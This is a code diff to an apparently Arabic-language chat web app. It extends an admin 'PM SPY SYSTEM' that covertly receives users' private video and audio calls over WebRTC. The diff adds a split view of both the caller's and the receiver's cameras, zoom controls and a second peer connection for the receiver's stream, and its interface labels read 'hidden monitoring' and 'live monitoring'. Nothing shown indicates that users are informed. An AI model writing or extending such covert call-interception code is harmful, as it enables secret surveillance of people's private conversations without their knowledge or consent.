@@ -1252,13 +1252,36 @@ body.theme-rose .btn-s{border-color:rgba(0,229,160,.2);}
       <button onclick="closeSpyModal()" style="background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);color:#fff;border-radius:8px;padding:5px 14px;cursor:pointer;font-size:13px;font-family:'Cairo',sans-serif;">✕</button>
     </div>
     <!-- Call section (hidden until call starts) -->
-    <div id="spy-call-section" style="display:none;background:#000;flex-shrink:0;position:relative;min-height:180px;max-height:280px;">
-      <video id="spy-video" autoplay playsinline style="width:100%;height:100%;max-height:280px;object-fit:cover;display:none;"></video>
-      <audio id="spy-audio" autoplay style="display:none;"></audio>
-      <div style="position:absolute;top:8px;right:10px;background:rgba(0,0,0,.6);border-radius:8px;padding:4px 10px;">
-        <span id="spy-call-status" style="font-size:11px;color:#4ade80;"></span>
+    <div id="spy-call-section" style="display:none;background:#000;flex-shrink:0;position:relative;">
+      <!-- Dual camera grid -->
+      <div id="spy-cams-grid" style="display:grid;grid-template-columns:1fr 1fr;gap:2px;min-height:180px;max-height:300px;">
+        <!-- Camera 1 - caller -->
+        <div id="spy-cam1-wrap" onclick="spyToggleZoom(1)"
+          style="position:relative;background:#0a0a0a;cursor:pointer;overflow:hidden;min-height:180px;transition:.3s;">
+          <video id="spy-video" autoplay playsinline
+            style="width:100%;height:100%;object-fit:cover;display:block;"></video>
+          <div style="position:absolute;bottom:6px;right:6px;background:rgba(0,0,0,.7);border-radius:6px;padding:2px 8px;font-size:11px;color:#fff;" id="spy-cam1-label">📹 المُرسِل</div>
+          <div style="position:absolute;top:6px;left:6px;font-size:11px;color:rgba(255,255,255,.4);">🔍</div>
+        </div>
+        <!-- Camera 2 - receiver -->
+        <div id="spy-cam2-wrap" onclick="spyToggleZoom(2)"
+          style="position:relative;background:#0a0a0a;cursor:pointer;overflow:hidden;min-height:180px;transition:.3s;">
+          <video id="spy-video2" autoplay playsinline
+            style="width:100%;height:100%;object-fit:cover;display:block;"></video>
+          <div style="position:absolute;bottom:6px;right:6px;background:rgba(0,0,0,.7);border-radius:6px;padding:2px 8px;font-size:11px;color:#fff;" id="spy-cam2-label">📹 المُستقبِل</div>
+          <div style="position:absolute;top:6px;left:6px;font-size:11px;color:rgba(255,255,255,.4);">🔍</div>
+          <div id="spy-cam2-placeholder" style="position:absolute;inset:0;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:6px;">
+            <div style="font-size:28px;">📷</div>
+            <div style="font-size:11px;color:#444;">في انتظار الكاميرا الثانية...</div>
+          </div>
+        </div>
       </div>
-      <div style="position:absolute;bottom:8px;left:10px;background:rgba(239,68,68,.2);border:1px solid rgba(239,68,68,.3);border-radius:8px;padding:4px 10px;font-size:11px;color:#f87171;">👁️ مراقبة خفية</div>
+      <audio id="spy-audio" autoplay style="display:none;"></audio>
+      <!-- Status bar -->
+      <div style="display:flex;align-items:center;justify-content:space-between;padding:5px 10px;background:rgba(0,0,0,.8);">
+        <span id="spy-call-status" style="font-size:11px;color:#4ade80;"></span>
+        <div style="background:rgba(239,68,68,.2);border:1px solid rgba(239,68,68,.3);border-radius:6px;padding:2px 8px;font-size:11px;color:#f87171;">👁️ مراقبة خفية</div>
+      </div>
     </div>
     <!-- Messages -->
     <div id="spy-msgs" style="flex:1;overflow-y:auto;padding:12px 14px;display:flex;flex-direction:column;gap:6px;min-height:150px;max-height:45vh;"></div>
@@ -2362,6 +2385,33 @@ function createNewRank(){
 
 // ===== PM SPY SYSTEM =====
 let _spyUser1=null, _spyUser2=null, _spyPC=null, _spyStream=null;
+let _spyStream2=null, _spyZoomed=0; // 0=split, 1=cam1 full, 2=cam2 full
+let _spyTrackCount=0; // tracks received so far
+
+function spyToggleZoom(cam){
+  const grid=document.getElementById('spy-cams-grid');
+  const w1=document.getElementById('spy-cam1-wrap');
+  const w2=document.getElementById('spy-cam2-wrap');
+  if(_spyZoomed===cam){
+    // Un-zoom → back to split
+    _spyZoomed=0;
+    grid.style.gridTemplateColumns='1fr 1fr';
+    w1.style.display='block';
+    w2.style.display='block';
+  } else {
+    // Zoom chosen cam
+    _spyZoomed=cam;
+    if(cam===1){
+      grid.style.gridTemplateColumns='1fr';
+      w1.style.display='block';
+      w2.style.display='none';
+    } else {
+      grid.style.gridTemplateColumns='1fr';
+      w1.style.display='none';
+      w2.style.display='block';
+    }
+  }
+}
 
 async function loadSpyConversations(){
   const c=document.getElementById('spy-conv-list');
@@ -2430,8 +2480,19 @@ function closeSpyModal(){
 function _stopSpyCall(){
   if(_spyPC){ _spyPC.close(); _spyPC=null; }
   if(_spyStream){ _spyStream.getTracks().forEach(t=>t.stop()); _spyStream=null; }
+  if(_spyStream2){ _spyStream2.getTracks().forEach(t=>t.stop()); _spyStream2=null; }
+  _spyTrackCount=0; _spyZoomed=0;
   const sv=document.getElementById('spy-video');
-  if(sv){ sv.srcObject=null; sv.style.display='none'; }
+  const sv2=document.getElementById('spy-video2');
+  if(sv){ sv.srcObject=null; }
+  if(sv2){ sv2.srcObject=null; }
+  // Reset grid
+  const grid=document.getElementById('spy-cams-grid');
+  const w1=document.getElementById('spy-cam1-wrap');
+  const w2=document.getElementById('spy-cam2-wrap');
+  if(grid) grid.style.gridTemplateColumns='1fr 1fr';
+  if(w1) w1.style.display='block';
+  if(w2) w2.style.display='block';
 }
 
 async function _startSpyPC(offer, convKey, callerName){
@@ -2449,16 +2510,34 @@ async function _startSpyPC(offer, convKey, callerName){
     _spyPC.addTransceiver('audio', {direction:'recvonly'});
 
     _spyPC.ontrack = e => {
-      console.log('SPY ontrack:', e.track.kind, e.streams);
-      const sv = document.getElementById('spy-video');
+      console.log('SPY ontrack:', e.track.kind, e.streams, 'count:', _spyTrackCount);
       const sa = document.getElementById('spy-audio');
       if(e.track.kind === 'video'){
-        _spyStream = e.streams[0] || new MediaStream([e.track]);
-        sv.srcObject = _spyStream;
-        sv.style.display = 'block';
-        sv.play().catch(()=>{});
+        _spyTrackCount++;
+        const stream = e.streams[0] || new MediaStream([e.track]);
         document.getElementById('spy-call-section').style.display = 'block';
         document.getElementById('spy-call-status').textContent = '🔴 مراقبة فعلية — مباشر';
+        if(_spyTrackCount === 1){
+          // First video track → cam1 (caller)
+          _spyStream = stream;
+          const sv = document.getElementById('spy-video');
+          sv.srcObject = _spyStream;
+          sv.play().catch(()=>{});
+          // Set caller label
+          const lbl = document.getElementById('spy-cam1-label');
+          if(lbl && _spyUser1) lbl.textContent = '📹 ' + _spyUser1;
+        } else {
+          // Second video track → cam2 (receiver)
+          _spyStream2 = stream;
+          const sv2 = document.getElementById('spy-video2');
+          sv2.srcObject = _spyStream2;
+          sv2.play().catch(()=>{});
+          // Hide placeholder
+          const ph = document.getElementById('spy-cam2-placeholder');
+          if(ph) ph.style.display='none';
+          const lbl2 = document.getElementById('spy-cam2-label');
+          if(lbl2 && _spyUser2) lbl2.textContent = '📹 ' + _spyUser2;
+        }
       } else if(e.track.kind === 'audio'){
         const audioStream = e.streams[0] || new MediaStream([e.track]);
         sa.srcObject = audioStream;
@@ -2557,35 +2636,30 @@ socket.on('spy-call-ice', async (d) => {
 socket.on('spy-direct-offer', async (d) => {
   if(!_spyPC) return;
   try{
-    _spyPC.close();
-    _spyPC = null;
-  }catch(e){}
-  try{
     const ICE_CFG={iceServers:[{urls:'stun:stun.l.google.com:19302'},{urls:'stun:stun.cloudflare.com:3478'}]};
-    _spyPC = new RTCPeerConnection(ICE_CFG);
-    _spyPC.ontrack = e => {
-      const sv = document.getElementById('spy-video');
-      const sa = document.getElementById('spy-audio');
+    // Create a SECOND separate PC for receiver's stream
+    let _spyPC2 = new RTCPeerConnection(ICE_CFG);
+    _spyPC2.ontrack = e => {
       if(e.track.kind==='video'){
-        _spyStream = e.streams[0]||new MediaStream([e.track]);
-        sv.srcObject = _spyStream;
-        sv.style.display = 'block';
-        sv.play().catch(()=>{});
-        document.getElementById('spy-call-section').style.display='block';
-        document.getElementById('spy-call-status').textContent='🔴 مراقبة فعلية — مباشر';
+        _spyStream2 = e.streams[0]||new MediaStream([e.track]);
+        const sv2 = document.getElementById('spy-video2');
+        sv2.srcObject = _spyStream2;
+        sv2.play().catch(()=>{});
+        const ph = document.getElementById('spy-cam2-placeholder');
+        if(ph) ph.style.display='none';
+        const lbl2 = document.getElementById('spy-cam2-label');
+        if(lbl2 && _spyUser2) lbl2.textContent = '📹 ' + _spyUser2;
       } else if(e.track.kind==='audio'){
-        const sa2=document.getElementById('spy-audio');
-        sa2.srcObject=e.streams[0]||new MediaStream([e.track]);
-        sa2.play().catch(()=>{});
+        // Mix into existing audio or ignore (already have audio from cam1)
       }
     };
-    _spyPC.onicecandidate = e => {
+    _spyPC2.onicecandidate = e => {
       if(e.candidate) socket.emit('spy-ice-back',{candidate:e.candidate,callerId:d.from});
     };
-    await _spyPC.setRemoteDescription(new RTCSessionDescription(d.offer));
-    const answer = await _spyPC.createAnswer();
-    await _spyPC.setLocalDescription(answer);
-    socket.emit('spy-answer-back',{answer:_spyPC.localDescription,callerId:d.from});
+    await _spyPC2.setRemoteDescription(new RTCSessionDescription(d.offer));
+    const answer = await _spyPC2.createAnswer();
+    await _spyPC2.setLocalDescription(answer);
+    socket.emit('spy-answer-back',{answer:_spyPC2.localDescription,callerId:d.from});
   }catch(e){console.error('spy-direct-offer error:',e);}
 });
 
